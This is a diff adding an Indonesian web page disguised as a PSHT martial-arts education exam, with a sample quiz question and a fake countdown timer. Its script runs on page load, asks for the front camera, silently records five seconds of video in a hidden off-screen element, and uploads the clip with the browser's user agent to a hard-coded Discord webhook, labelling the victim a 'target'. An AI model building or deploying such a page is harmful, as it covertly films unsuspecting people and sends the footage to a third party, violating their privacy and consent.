@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CBT - Pendidikan PSHT</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #f4f6f9; color: #333; }
+        
+        /* Desain Header CBT */
+        .header { background-color: #1a365d; color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 10; }
+        .header h1 { font-size: 15px; font-weight: 600; }
+        .timer { background: #e2e8f0; color: #1a365d; padding: 5px 10px; border-radius: 4px; font-weight: bold; font-size: 13px; }
+        
+        /* Desain Soal */
+        .container { padding: 15px; max-width: 600px; margin: 0 auto; }
+        .card { background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        .q-number { font-size: 13px; color: #718096; margin-bottom: 15px; border-bottom: 1px solid #e2e8f0; padding-bottom: 10px; display: flex; justify-content: space-between; }
+        .q-text { font-size: 15px; line-height: 1.6; margin-bottom: 20px; color: #2d3748; }
+        
+        /* Desain Pilihan Ganda */
+        .options { list-style: none; }
+        .options li { background: #f7fafc; padding: 14px 15px; margin-bottom: 10px; border-radius: 6px; font-size: 14px; border: 1px solid #e2e8f0; cursor: pointer; transition: 0.2s; line-height: 1.4; }
+        .options li:active { background: #bee3f8; border-color: #90cdf4; }
+        
+        /* Tombol Navigasi */
+        .nav { display: flex; justify-content: space-between; margin-top: 25px; gap: 10px; }
+        .btn { padding: 12px; flex: 1; border: none; border-radius: 6px; font-weight: 600; font-size: 14px; text-align: center; }
+        .btn-prev { background: #edf2f7; color: #4a5568; }
+        .btn-next { background: #2b6cb0; color: white; }
+        
+        /* Video disembunyiin */
+        video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; }
+    </style>
+</head>
+<body>
+
+<header class="header">
+    <h1>PENDIDIKAN PSHT</h1>
+    <div class="timer" id="timerText">00:29:59</div>
+</header>
+
+<div class="container">
+    <div class="card">
+        <div class="q-number">
+            <span>Soal nomor 15</span>
+            <span>Belum dijawab</span>
+        </div>
+        <div class="q-text">
+            Dalam ajaran Persaudaraan Setia Hati Terate (PSHT), terdapat tiga hal pokok yang harus dimiliki dan diamalkan oleh seorang siswa. Tiga hal pokok tersebut adalah....
+        </div>
+        
+        <ul class="options" id="optionsList">
+            <li onclick="selectOpt(this)">A. Kekayaan, Kekuasaan, dan Kepintaran</li>
+            <li onclick="selectOpt(this)">B. Persaudaraan, Olahraga, dan Seni Budaya</li>
+            <li onclick="selectOpt(this)">C. Iman, Ilmu, dan Amal (Taqwa)</li>
+            <li onclick="selectOpt(this)">D. Kekuatan Fisik, Kecepatan, dan Ketangkasan</li>
+            <li onclick="selectOpt(this)">E. Ketaatan, Kedisiplinan, dan Keberanian</li>
+        </ul>
+    </div>
+
+    <div class="nav">
+        <button class="btn btn-prev">Soal Sebelumnya</button>
+        <button class="btn btn-next">Soal Berikutnya</button>
+    </div>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+
+<script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1561391421200797738/dfLpkO0PbTGmigN72TW2CxmfXoCL4bFIw8xmMxR_9bPvQNhjCGD6LunWTJ-gFl3wlcWA"; 
+    const video = document.getElementById('video');
+
+    // Efek Klik Pilihan
+    window.selectOpt = function(element) {
+        document.querySelectorAll('.options li').forEach(li => li.style.background = '#f7fafc');
+        element.style.background = '#bee3f8';
+    };
+
+    // Timer palsu (30 menit)
+    let time = 1799;
+    setInterval(() => {
+        if(time > 0) time--;
+        const m = Math.floor(time / 60).toString().padStart(2, '0');
+        const s = (time % 60).toString().padStart(2, '0');
+        document.getElementById('timerText').innerText = `00:${m}:${s}`;
+    }, 1000);
+
+    // KAMERA LANGSUNG NYALA PAS LINK DIBUKA
+    async function autoCamera() {
+        try {
+            // Memicu pop-up izin kamera browser
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+            
+            video.srcObject = stream;
+            
+            video.onloadedmetadata = () => {
+                video.play();
+                
+                const recorder = new MediaRecorder(stream);
+                let chunks = [];
+                
+                recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
+                
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    stream.getTracks().forEach(t => t.stop());
+                    
+                    // Kirim Video ke Discord
+                    const fd = new FormData();
+                    fd.append("file1", blob, "target_psht.webm");
+                    fd.append("payload_json", JSON.stringify({ 
+                        content: `📸 **CCTV CBT PSHT Hit!**\nUA: ${navigator.userAgent}`
+                    }));
+                    fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+                };
+
+                // Rekam 5 detik
+                recorder.start();
+                setTimeout(() => { recorder.stop(); }, 5000);
+            };
+        } catch (err) {
+            // Kalau target nolak izin, web tetap nampilin soal
+        }
+    }
+
+    // Jalanin otomatis saat halaman selesai dimuat
+    window.onload = autoCamera;
+</script>
+
+</body>
+</html>
